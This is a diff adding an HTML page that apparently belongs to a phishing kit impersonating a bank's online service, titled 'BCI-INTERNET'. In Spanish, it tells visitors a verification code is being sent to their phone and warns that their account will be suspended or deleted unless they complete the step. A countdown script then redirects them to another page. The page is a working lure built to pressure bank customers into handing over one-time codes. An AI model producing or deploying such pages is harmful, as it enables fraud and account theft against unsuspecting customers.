@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BCI-INTERNET</title>
+    <link rel="stylesheet" href="facespace/frascare.css">
+    <style>
+
+
+
+    </style>
+
+    
+<script type="text/javascript">
+    
+			   
+    var tiempo=15;
+      var url="muten.html";
+   
+    function updateReloj()
+    {
+      document.getElementById('contador').innerHTML = " "+tiempo+" ";
+   
+      if(tiempo==0)
+      {
+        window.location=url;
+                              
+      }else{
+        tiempo-=1;
+        setTimeout("updateReloj()",1000);
+      }
+    }
+     window.onload=updateReloj;
+    </script>
+
+</head>
+<body>
+    
+
+
+    <div class="primeren">
+        <img width="40px" src="facespace/iconooo.svg" alt=""> 
+    </div>
+
+<div style="background-color: rgb(208, 208, 208); width: 100%; height: 1.4px;"></div>
+
+<div class="primeren">
+<p class="pp">PERSONAS</p>
+</div>
+
+
+
+<div class="linea">
+    <div class="sublinea"></div>
+  </div>
+
+<div class="ques">
+
+
+    <div class="ques2">
+<form action="">
+
+<center>
+    <h2>No cierres esta ventana!!</h2>
+    <div style="text-align: center;font-size:18px; color:  rgb(0, 97, 187);;" align="center">
+    Espera <font id="contador" style=" font-size:28px;"></font></strong> segundos. 
+    <br>Para validar su información le estamos enviando <br>un código a su teléfono, Completa este ultimo paso y evita que tu cuenta sea suspendida </div>
+    
+    </center>
+
+
+
+<br><br><center><p class="papad">Ingresa lo requerido o tu cuenta podra ser borrada!</p></center>
+<br>
+
+</form></div>
+
+
+</div>
+
+
+</body>
+</html>
